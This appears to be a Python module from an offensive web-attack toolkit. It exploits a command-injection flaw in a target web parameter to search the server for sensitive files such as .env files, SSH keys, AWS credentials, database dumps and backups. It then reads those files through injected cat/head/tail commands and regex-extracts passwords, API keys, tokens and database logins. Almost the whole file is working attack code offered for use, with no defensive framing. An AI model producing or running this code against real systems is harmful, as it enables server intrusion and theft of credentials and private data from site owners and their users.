#!/usr/bin/env python3
"""
Advanced File Hunter - Recursive File Search via Command Injection
IQ 200 - Hunt for sensitive files across the entire filesystem
"""

import sys
import json
import re
from typing import Dict, List
from urllib.parse import quote

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class AdvancedFileHunter:
    """Hunt for sensitive files using command injection"""

    # IQ 200: Comprehensive sensitive file patterns
    SENSITIVE_FILES = {
        'credentials': [
            '.env', '.env.local', '.env.production',
            'config.php', 'database.yml', 'settings.py',
            'credentials.json', 'secrets.json', 'key.pem',
            'id_rsa', 'id_dsa', '.ssh/id_rsa',
            '.aws/credentials', '.docker/config.json',
        ],
        'config': [
            'web.config', 'app.config', 'appsettings.json',
            'config.json', 'config.xml', 'settings.xml',
            'application.properties', 'database.properties',
        ],
        'source_code': [
            '*.php', '*.py', '*.js', '*.java', '*.rb',
            '*.asp', '*.aspx', '*.jsp',
        ],
        'database': [
            '*.sql', '*.db', '*.sqlite', '*.mdb',
            'dump.sql', 'backup.sql', 'database.sql',
        ],
        'backups': [
            '*.bak', '*.backup', '*.old', '*.zip', '*.tar.gz',
            'backup.tar.gz', 'site.tar.gz', 'www.tar.gz',
        ],
        'logs': [
            '*.log', 'error.log', 'access.log', 'debug.log',
            'application.log', 'server.log',
        ],
    }

    def __init__(self, session=None, timeout=15):
        self.session = session or (requests.Session() if HAS_REQUESTS else None)
        self.timeout = timeout
        self.found_files = []

    def hunt_sensitive_files(self, url: str, params: Dict, vulnerable_param: str, cmd_prefix: str = ';') -> Dict:
        """
        Hunt for sensitive files using find, locate, and grep
        IQ 200: Maximum file discovery
        """
        result = {
            'success': False,
            'files_found': {},
            'total_files': 0,
            'evidence': []
        }

        if not HAS_REQUESTS:
            return result

        print(json.dumps({'file_hunt': 'starting', 'message': 'Starting advanced file hunting...'}), file=sys.stderr, flush=True)

        # Hunt for each category
        for category, file_patterns in self.SENSITIVE_FILES.items():
            print(json.dumps({'file_hunt': 'category', 'category': category, 'patterns': len(file_patterns)}), file=sys.stderr, flush=True)

            category_files = []

            for pattern in file_patterns[:5]:  # Limit to 5 patterns per category for speed
                # Create find commands
                hunt_payloads = [
                    f'{cmd_prefix} find /var/www -name "{pattern}" 2>/dev/null | head -10',
                    f'{cmd_prefix} find /home -name "{pattern}" 2>/dev/null | head -10',
                    f'{cmd_prefix} find . -name "{pattern}" 2>/dev/null | head -10',
                    f'{cmd_prefix} locate "{pattern}" 2>/dev/null | head -10',
                ]

                for payload in hunt_payloads:
                    test_params = params.copy()
                    test_params[vulnerable_param] = payload

                    try:
                        response = self.session.get(url, params=test_params, timeout=self.timeout)

                        # Look for file paths
                        file_paths = re.findall(r'(/[a-zA-Z0-9/_.-]+\.[a-z]{2,5})', response.text)

                        if file_paths:
                            category_files.extend(file_paths)
                            result['evidence'].append({
                                'category': category,
                                'pattern': pattern,
                                'payload': payload,
                                'files': file_paths
                            })

                    except Exception as e:
                        continue

            # Remove duplicates
            category_files = list(set(category_files))

            if category_files:
                result['files_found'][category] = category_files
                result['total_files'] += len(category_files)
                print(json.dumps({'file_hunt': 'category_result', 'category': category, 'found': len(category_files), 'sample': category_files[:3]}), file=sys.stderr, flush=True)

        result['success'] = result['total_files'] > 0

        print(json.dumps({
            'file_hunt': 'completed',
            'categories': len(result['files_found']),
            'total_files': result['total_files'],
            'message': f'File hunt complete: {result["total_files"]} sensitive files found'
        }), file=sys.stderr, flush=True)

        return result

    def extract_file_contents(self, url: str, params: Dict, vulnerable_param: str, file_path: str, cmd_prefix: str = ';', max_lines: int = 50) -> Dict:
        """
        Extract contents from a specific file
        IQ 200: Get the actual data!
        """
        result = {
            'success': False,
            'file': file_path,
            'content': None,
            'lines': [],
            'sensitive_data': []
        }

        if not HAS_REQUESTS:
            return result

        print(json.dumps({'file_extract': 'starting', 'file': file_path, 'message': f'Extracting contents from: {file_path}'}), file=sys.stderr, flush=True)

        # Extract file contents
        extract_payloads = [
            f'{cmd_prefix} cat {file_path} 2>/dev/null | head -{max_lines}',
            f'{cmd_prefix} head -{max_lines} {file_path} 2>/dev/null',
            f'{cmd_prefix} tail -{max_lines} {file_path} 2>/dev/null',
        ]

        for payload in extract_payloads:
            test_params = params.copy()
            test_params[vulnerable_param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=self.timeout)

                if len(response.text) > 100:  # If we got content
                    result['content'] = response.text[:2000]  # First 2000 chars
                    result['lines'] = response.text.split('\n')[:max_lines]

                    # Look for sensitive data patterns
                    sensitive_patterns = {
                        'password': r'(password|passwd|pwd)\s*[=:]\s*[\'"]?([^\'"\s]+)',
                        'api_key': r'(api[_-]?key|apikey)\s*[=:]\s*[\'"]?([^\'"\s]+)',
                        'secret': r'(secret|token)\s*[=:]\s*[\'"]?([^\'"\s]+)',
                        'database': r'(database|db_name|dbname)\s*[=:]\s*[\'"]?([^\'"\s]+)',
                        'host': r'(host|server|hostname)\s*[=:]\s*[\'"]?([^\'"\s]+)',
                        'user': r'(user|username|db_user)\s*[=:]\s*[\'"]?([^\'"\s]+)',
                    }

                    for data_type, pattern in sensitive_patterns.items():
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            result['sensitive_data'].append({
                                'type': data_type,
                                'matches': [m[1] if isinstance(m, tuple) else m for m in matches[:5]]
                            })

                    result['success'] = True
                    break

            except Exception as e:
                continue

        if result['success']:
            print(json.dumps({
                'file_extract': 'completed',
                'file': file_path,
                'lines': len(result['lines']),
                'sensitive_data': len(result['sensitive_data']),
                'message': f'Extracted {len(result["lines"])} lines, found {len(result["sensitive_data"])} sensitive data types'
            }), file=sys.stderr, flush=True)

        return result

    def comprehensive_file_exfiltration(self, url: str, params: Dict, vulnerable_param: str, cmd_prefix: str = ';') -> Dict:
        """
        Complete file hunting and extraction
        IQ 200: Find and extract EVERYTHING!
        """
        result = {
            'success': False,
            'hunt_result': {},
            'extracted_files': {},
            'total_sensitive_data': 0
        }

        print(json.dumps({'file_exfil': 'comprehensive', 'status': 'starting', 'message': 'Starting comprehensive file exfiltration...'}), file=sys.stderr, flush=True)

        # Step 1: Hunt for files
        hunt_result = self.hunt_sensitive_files(url, params, vulnerable_param, cmd_prefix)
        result['hunt_result'] = hunt_result

        # Step 2: Extract contents from interesting files
        all_files = []
        for category, files in hunt_result.get('files_found', {}).items():
            all_files.extend(files)

        # Prioritize credential and config files
        priority_files = [f for f in all_files if any(keyword in f.lower() for keyword in ['.env', 'config', 'credential', 'secret', 'key', 'password'])]

        if not priority_files:
            priority_files = all_files[:5]  # Take first 5 files

        for file_path in priority_files[:10]:  # Limit to 10 files for speed
            extraction = self.extract_file_contents(url, params, vulnerable_param, file_path, cmd_prefix, max_lines=30)

            if extraction['success']:
                result['extracted_files'][file_path] = extraction
                result['total_sensitive_data'] += len(extraction.get('sensitive_data', []))

        result['success'] = len(result['extracted_files']) > 0

        print(json.dumps({
            'file_exfil': 'comprehensive',
            'status': 'completed',
            'files_found': hunt_result.get('total_files', 0),
            'files_extracted': len(result['extracted_files']),
            'sensitive_data_types': result['total_sensitive_data'],
            'message': f'Exfiltration complete: {len(result["extracted_files"])} files extracted with {result["total_sensitive_data"]} sensitive data types'
        }), file=sys.stderr, flush=True)

        return result


if __name__ == '__main__':
    # Test example
    print(json.dumps({'test': 'AdvancedFileHunter', 'message': 'IQ 200 File Hunting Module Loaded'}))
